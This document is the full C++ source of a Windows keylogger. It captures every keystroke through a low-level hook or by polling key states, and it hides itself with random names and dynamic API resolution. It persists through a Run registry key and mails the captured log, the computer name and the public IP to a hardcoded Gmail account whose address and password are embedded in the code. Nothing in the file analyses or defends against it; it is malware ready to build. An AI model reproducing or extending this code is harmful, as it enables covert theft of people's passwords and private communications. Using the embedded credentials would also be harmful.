#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <fstream>
#include <string>
#include <ctime>
#include <vector>
#include <random>
#include <sstream>
#include <algorithm>
#include <Wincrypt.h>
#include <memory>  // Added for std::unique_ptr

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")

// ====================== ENHANCED OBFUSCATION ======================
#define HIDE_STR(str) []() -> std::string { \
    const std::string key = "7H#kP9m!zTsQvR"; \
    std::string s = str; \
    for (size_t i = 0; i < s.size(); ++i) { \
        s[i] ^= key[i % key.size()]; \
        s[i] = (s[i] << 4) | (s[i] >> 4); \
    } \
    return s; \
}()

// ====================== SECURE CREDENTIAL HANDLING ======================
std::string DecryptCredential(const std::string& input) {
    const std::string key = "7H#kP9m!zTsQvR";
    std::string output = input;
    for (size_t i = 0; i < output.size(); ++i) {
        output[i] = (output[i] >> 4) | (output[i] << 4);
        output[i] ^= key[i % key.size()];
    }
    return output;
}

// ====================== API RESOLUTION ======================
struct APIResolver {
    template <typename T>
    static T Get(const std::string& lib, const std::string& func) {
        HMODULE hMod = LoadLibraryA(lib.c_str());
        if (!hMod) return nullptr;
        return reinterpret_cast<T>(GetProcAddress(hMod, func.c_str()));
    }
};

// ====================== RANDOMIZED IDENTIFIERS ======================
std::string GenerateRandomString(size_t length) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    result.reserve(length);
    
    HCRYPTPROV hProv;
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        BYTE buffer[128];
        if (CryptGenRandom(hProv, sizeof(buffer), buffer)) {
            for (size_t i = 0; i < length; ++i) {
                result += charset[buffer[i] % (sizeof(charset) - 1)];
            }
        }
        CryptReleaseContext(hProv, 0);
    }
    return result;
}

// ====================== CONFIGURATION ======================
const std::string ENCRYPTED_USER = HIDE_STR("loirverse@gmail.com");
const std::string ENCRYPTED_PASS = HIDE_STR("kfjnnlovftazuxkk");
const std::string ENCRYPTED_SMTP = HIDE_STR("smtp.gmail.com");
const int SMTP_PORT = 587;

std::string userPath;
std::string computerName;
HANDLE hLogMutex;
std::string keystrokeBuffer;

// Generated random identifiers
std::string mutexName;
std::string regValueName;
std::string exeName;
std::string dirName;

// ====================== UTILITIES ======================
std::string GetTimestamp() {
    SYSTEMTIME st;
    auto pGetLocalTime = APIResolver::Get<decltype(&GetLocalTime)>("kernel32.dll", "GetLocalTime");
    if (pGetLocalTime) pGetLocalTime(&st);
    
    char buffer[128] = {0};
    auto pwsprintf = APIResolver::Get<decltype(&wsprintfA)>("user32.dll", "wsprintfA");
    if (pwsprintf) pwsprintf(buffer, "[%04d-%02d-%02d %02d:%02d] ", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
    return buffer;
}

void WriteToLog(const std::string& content) {
    auto pWaitForSingleObject = APIResolver::Get<decltype(&WaitForSingleObject)>("kernel32.dll", "WaitForSingleObject");
    auto pReleaseMutex = APIResolver::Get<decltype(&ReleaseMutex)>("kernel32.dll", "ReleaseMutex");
    
    if (pWaitForSingleObject) pWaitForSingleObject(hLogMutex, INFINITE);
    keystrokeBuffer += content;
    if (pReleaseMutex) pReleaseMutex(hLogMutex);
}

// Define function pointer types for WinINet
typedef HINTERNET (WINAPI *InternetOpenFn)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *InternetOpenUrlFn)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *InternetReadFileFn)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *InternetCloseHandleFn)(HINTERNET);

std::string GetPublicIP() {
    auto pInternetOpen = APIResolver::Get<InternetOpenFn>("wininet.dll", "InternetOpenA");
    auto pInternetOpenUrl = APIResolver::Get<InternetOpenUrlFn>("wininet.dll", "InternetOpenUrlA");
    auto pInternetReadFile = APIResolver::Get<InternetReadFileFn>("wininet.dll", "InternetReadFile");
    auto pInternetCloseHandle = APIResolver::Get<InternetCloseHandleFn>("wininet.dll", "InternetCloseHandle");
    
    if (!pInternetOpen || !pInternetOpenUrl || !pInternetReadFile || !pInternetCloseHandle) 
        return "unknown";
    
    HINTERNET hInternet = pInternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "unknown";
    
    HINTERNET hUrl = pInternetOpenUrl(hInternet, "http://api.ipify.org", NULL, 0, 
                                     INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        pInternetCloseHandle(hInternet);
        return "unknown";
    }
    
    char buffer[128] = {0};
    DWORD bytesRead;
    std::string ip;
    while (pInternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead)) {
        if (bytesRead == 0) break;
        ip.append(buffer, bytesRead);
    }
    
    pInternetCloseHandle(hUrl);
    pInternetCloseHandle(hInternet);
    
    return ip.empty() ? "unknown" : ip;
}

// ====================== KEYLOGGER ======================
class IKeylogger {
public:
    virtual void Start() = 0;
    virtual ~IKeylogger() = default;
};

class HookKeylogger : public IKeylogger {
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_ACTION) {
            KBDLLHOOKSTRUCT* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
            
            if (wParam == WM_KEYDOWN) {
                std::string logEntry;
                
                // Special keys handling
                switch (kb->vkCode) {
                    case VK_SPACE: logEntry = "[Space]"; break;
                    case VK_RETURN: logEntry = "[Enter]\n"; break;
                    case VK_BACK: logEntry = "[Backspace]"; break;
                    case VK_TAB: logEntry = "[Tab]"; break;
                    case VK_ESCAPE: logEntry = "[Esc]"; break;
                    case VK_CAPITAL: logEntry = "[CapsLock]"; break;
                    case VK_SHIFT: logEntry = "[Shift]"; break;
                    case VK_CONTROL: logEntry = "[Ctrl]"; break;
                    case VK_MENU: logEntry = "[Alt]"; break;
                    case VK_LWIN: case VK_RWIN: logEntry = "[Win]"; break;
                    default:
                        // Alphanumeric handling
                        if ((kb->vkCode >= 0x30 && kb->vkCode <= 0x5A)) {
                            char c = static_cast<char>(kb->vkCode);
                            bool isShift = GetAsyncKeyState(VK_SHIFT) < 0;
                            
                            // Handle letters
                            if (kb->vkCode >= 0x41 && kb->vkCode <= 0x5A) {
                                c = isShift ? c : c + 32;
                            }
                            // Handle numbers/symbols
                            else if (isShift) {
                                const char shiftMap[] = ")!@#$%^&*(";
                                c = shiftMap[kb->vkCode - 0x30];
                            }
                            
                            logEntry = std::string(1, c);
                        }
                }
                
                if (!logEntry.empty()) {
                    WriteToLog(logEntry);
                }
            }
        }
        
        auto pCallNextHook = APIResolver::Get<decltype(&CallNextHookEx)>("user32.dll", "CallNextHookEx");
        if (pCallNextHook) 
            return pCallNextHook(nullptr, nCode, wParam, lParam);
        return 0;
    }

public:
    void Start() override {
        auto pSetHook = APIResolver::Get<decltype(&SetWindowsHookExA)>("user32.dll", "SetWindowsHookExA");
        if (!pSetHook) return;
        
        HHOOK hook = pSetHook(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(nullptr), 0);
        
        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        
        auto pUnhook = APIResolver::Get<decltype(&UnhookWindowsHookEx)>("user32.dll", "UnhookWindowsHookEx");
        if (pUnhook) pUnhook(hook);
    }
};

class PollKeylogger : public IKeylogger {
public:
    void Start() override {
        BYTE keyState[256] = {0};
        auto pGetAsyncKeyState = APIResolver::Get<decltype(&GetAsyncKeyState)>("user32.dll", "GetAsyncKeyState");
        if (!pGetAsyncKeyState) return;
        
        while (true) {
            for (int i = 8; i < 256; i++) {
                SHORT state = pGetAsyncKeyState(i);
                
                if (state & 0x8000 && !keyState[i]) {
                    // Key pressed
                    keyState[i] = 1;
                    
                    // Handle special keys
                    std::string key;
                    switch (i) {
                        case VK_SPACE: key = "[Space]"; break;
                        case VK_RETURN: key = "[Enter]\n"; break;
                        case VK_BACK: key = "[Backspace]"; break;
                        case VK_TAB: key = "[Tab]"; break;
                        case VK_ESCAPE: key = "[Esc]"; break;
                        case VK_CAPITAL: key = "[CapsLock]"; break;
                        case VK_SHIFT: key = "[Shift]"; break;
                        case VK_CONTROL: key = "[Ctrl]"; break;
                        case VK_MENU: key = "[Alt]"; break;
                        case VK_LWIN: case VK_RWIN: key = "[Win]"; break;
                        default:
                            // Alphanumeric keys
                            char c = static_cast<char>(i);
                            if (i >= 'A' && i <= 'Z') {
                                bool isShift = GetAsyncKeyState(VK_SHIFT) < 0;
                                key = std::string(1, isShift ? c : c + 32);
                            }
                            else if ((i >= 0x30 && i <= 0x39) || 
                                     (i >= 0xBA && i <= 0xC0)) {
                                key = std::string(1, c);
                            }
                    }
                    
                    if (!key.empty()) {
                        WriteToLog(key);
                    }
                } 
                else if (!(state & 0x8000) && keyState[i]) {
                    keyState[i] = 0;
                }
            }
            
            Sleep(10);
        }
    }
};

IKeylogger* CreateKeylogger() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 1);
    return (dis(gen) == 0) 
        ? static_cast<IKeylogger*>(new HookKeylogger()) 
        : static_cast<IKeylogger*>(new PollKeylogger());
};

// ====================== BASE64 ENCODING ======================
std::string Base64Encode(const std::string& input) {
    DWORD len = 0;
    auto pCryptBinaryToStringA = APIResolver::Get<decltype(&CryptBinaryToStringA)>("crypt32.dll", "CryptBinaryToStringA");
    if (!pCryptBinaryToStringA) return "";
    
    pCryptBinaryToStringA((const BYTE*)input.c_str(), input.length(), 
                        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
    
    std::string output(len, '\0');
    if (pCryptBinaryToStringA((const BYTE*)input.c_str(), input.length(), 
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &output[0], &len)) {
        output.resize(len - 1); // Remove null terminator
        return output;
    }
    return "";
}

// ====================== PROPER SMTP IMPLEMENTATION ======================
bool SendEmail(const std::string& subject, const std::string& body) {
    // Decrypt credentials at runtime
    const std::string EMAIL_USER = DecryptCredential(ENCRYPTED_USER);
    const std::string EMAIL_PASS = DecryptCredential(ENCRYPTED_PASS);
    const std::string SMTP_SERVER = DecryptCredential(ENCRYPTED_SMTP);
    
    // Initialize Winsock
    WSADATA wsaData;
    auto pWSAStartup = APIResolver::Get<decltype(&WSAStartup)>("ws2_32.dll", "WSAStartup");
    auto pWSACleanup = APIResolver::Get<decltype(&WSACleanup)>("ws2_32.dll", "WSACleanup");
    auto pSocket = APIResolver::Get<decltype(&socket)>("ws2_32.dll", "socket");
    auto pConnect = APIResolver::Get<decltype(&connect)>("ws2_32.dll", "connect");
    auto pSend = APIResolver::Get<decltype(&send)>("ws2_32.dll", "send");
    auto pRecv = APIResolver::Get<decltype(&recv)>("ws2_32.dll", "recv");
    auto pClosesocket = APIResolver::Get<decltype(&closesocket)>("ws2_32.dll", "closesocket");
    auto pGethostbyname = APIResolver::Get<decltype(&gethostbyname)>("ws2_32.dll", "gethostbyname");
    
    if (!pWSAStartup || !pWSACleanup || !pSocket || !pConnect || 
        !pSend || !pRecv || !pClosesocket || !pGethostbyname) {
        return false;
    }
    
    if (pWSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        return false;
    }
    
    // Resolve server address
    hostent* host = pGethostbyname(SMTP_SERVER.c_str());
    if (!host) {
        pWSACleanup();
        return false;
    }
    
    SOCKET sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        pWSACleanup();
        return false;
    }
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SMTP_PORT);
    serverAddr.sin_addr = *((in_addr*)host->h_addr);
    
    if (pConnect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
        pClosesocket(sock);
        pWSACleanup();
        return false;
    }
    
    // SMTP conversation
    auto SendCommand = [&](const std::string& cmd, int expected) -> bool {
        std::string fullCmd = cmd + "\r\n";
        if (pSend(sock, fullCmd.c_str(), fullCmd.size(), 0) <= 0) 
            return false;
        
        char buffer[1024];
        int bytes = pRecv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) return false;
        
        buffer[bytes] = '\0';
        return std::stoi(buffer) == expected;
    };
    
    // SMTP handshake
    char recvBuf[1024];
    pRecv(sock, recvBuf, sizeof(recvBuf), 0); // Read welcome
    
    if (!SendCommand("EHLO localhost", 250)) return false;
    if (!SendCommand("AUTH LOGIN", 334)) return false;
    if (!SendCommand(Base64Encode(EMAIL_USER), 334)) return false;
    if (!SendCommand(Base64Encode(EMAIL_PASS), 235)) return false;
    if (!SendCommand("MAIL FROM: <" + EMAIL_USER + ">", 250)) return false;
    if (!SendCommand("RCPT TO: <" + EMAIL_USER + ">", 250)) return false;
    if (!SendCommand("DATA", 354)) return false;
    
    // Construct email
    std::string emailData = "From: " + EMAIL_USER + "\r\n"
        "To: " + EMAIL_USER + "\r\n"
        "Subject: " + subject + "\r\n"
        "Content-Type: text/plain; charset=\"UTF-8\"\r\n\r\n" + body + "\r\n.\r\n";
    
    if (pSend(sock, emailData.c_str(), emailData.size(), 0) <= 0) {
        pClosesocket(sock);
        pWSACleanup();
        return false;
    }
    
    // Cleanup
    SendCommand("QUIT", 221);
    pClosesocket(sock);
    pWSACleanup();
    return true;
}

DWORD WINAPI EmailThread(LPVOID) {
    auto pSleep = APIResolver::Get<decltype(&Sleep)>("kernel32.dll", "Sleep");
    auto pWaitForSingleObject = APIResolver::Get<decltype(&WaitForSingleObject)>("kernel32.dll", "WaitForSingleObject");
    auto pReleaseMutex = APIResolver::Get<decltype(&ReleaseMutex)>("kernel32.dll", "ReleaseMutex");
    
    while (true) {
        if (pSleep) pSleep(86400000); // 24 hours
        
        if (pWaitForSingleObject) pWaitForSingleObject(hLogMutex, INFINITE);
        
        if (!keystrokeBuffer.empty()) {
            // Create log file with computer name
            std::string logPath = userPath + computerName + "_log.txt";
            std::ofstream logFile(logPath);
            if (logFile) {
                logFile << keystrokeBuffer;
                logFile.close();
            }
            
            // Get public IP
            std::string publicIP = GetPublicIP();
            
            // Build email body
            std::string fullBody = "Computer Name: " + computerName + "\n";
            fullBody += "Public IP: " + publicIP + "\n\n";
            fullBody += keystrokeBuffer;
            
            // Send email with log contents
            std::string subject = "Report - " + computerName + " - " + GetTimestamp();
            SendEmail(subject, fullBody);
            
            // Clear buffer
            keystrokeBuffer.clear();
        }
        
        if (pReleaseMutex) pReleaseMutex(hLogMutex);
    }
    return 0;
}

// ====================== RANDOMIZED PERSISTENCE ======================
void InstallPersistence() {
    auto pGetModuleFileName = APIResolver::Get<decltype(&GetModuleFileNameA)>("kernel32.dll", "GetModuleFileNameA");
    auto pCopyFile = APIResolver::Get<decltype(&CopyFileA)>("kernel32.dll", "CopyFileA");
    auto pRegOpenKey = APIResolver::Get<decltype(&RegOpenKeyExA)>("advapi32.dll", "RegOpenKeyExA");
    auto pRegSetValue = APIResolver::Get<decltype(&RegSetValueExA)>("advapi32.dll", "RegSetValueExA");
    
    if (!pGetModuleFileName || !pCopyFile || !pRegOpenKey || !pRegSetValue) 
        return;
    
    char exePath[MAX_PATH];
    pGetModuleFileName(nullptr, exePath, MAX_PATH);
    
    std::string targetPath = userPath + exeName;
    pCopyFile(exePath, targetPath.c_str(), FALSE);

    HKEY hKey;
    if (pRegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        pRegSetValue(hKey, regValueName.c_str(), 0, REG_SZ, 
                    reinterpret_cast<const BYTE*>(targetPath.c_str()), targetPath.size());
        RegCloseKey(hKey);
    }
}

// ====================== MAIN ======================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Generate randomized identifiers
    mutexName = GenerateRandomString(12);
    regValueName = GenerateRandomString(10);
    exeName = GenerateRandomString(8) + ".exe";
    dirName = GenerateRandomString(10);

    // Initialize APIs
    auto pGetEnvironmentVariable = APIResolver::Get<decltype(&GetEnvironmentVariableA)>("kernel32.dll", "GetEnvironmentVariableA");
    auto pCreateDirectory = APIResolver::Get<decltype(&CreateDirectoryA)>("kernel32.dll", "CreateDirectoryA");
    auto pCreateMutex = APIResolver::Get<decltype(&CreateMutexA)>("kernel32.dll", "CreateMutexA");
    auto pCreateThread = APIResolver::Get<decltype(&CreateThread)>("kernel32.dll", "CreateThread");
    auto pCloseHandle = APIResolver::Get<decltype(&CloseHandle)>("kernel32.dll", "CloseHandle");
    auto pGetComputerName = APIResolver::Get<decltype(&GetComputerNameA)>("kernel32.dll", "GetComputerNameA");
    
    // Get computer name
    char compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(compName);
    if (pGetComputerName && pGetComputerName(compName, &size)) {
        computerName = compName;
    } else {
        computerName = "unknown";
    }
    
    // Get AppData path
    char appData[MAX_PATH];
    if (pGetEnvironmentVariable) 
        pGetEnvironmentVariable("APPDATA", appData, MAX_PATH);
    userPath = std::string(appData) + "\\" + dirName + "\\";
    if (pCreateDirectory) 
        pCreateDirectory(userPath.c_str(), NULL);
    
    // Create mutex with random name
    if (pCreateMutex) 
        hLogMutex = pCreateMutex(NULL, FALSE, mutexName.c_str());
    
    // Install persistence
    InstallPersistence();
    
    // Start email thread
    HANDLE hEmailThread = NULL;
    if (pCreateThread) 
        hEmailThread = pCreateThread(NULL, 0, EmailThread, NULL, 0, NULL);
    
    // Start polymorphic keylogger
    std::unique_ptr<IKeylogger> keylogger(CreateKeylogger());
    keylogger->Start();
    
    // Cleanup
    if (pCloseHandle) {
        if (hEmailThread) pCloseHandle(hEmailThread);
        if (hLogMutex) pCloseHandle(hLogMutex);
    }
    return 0;
}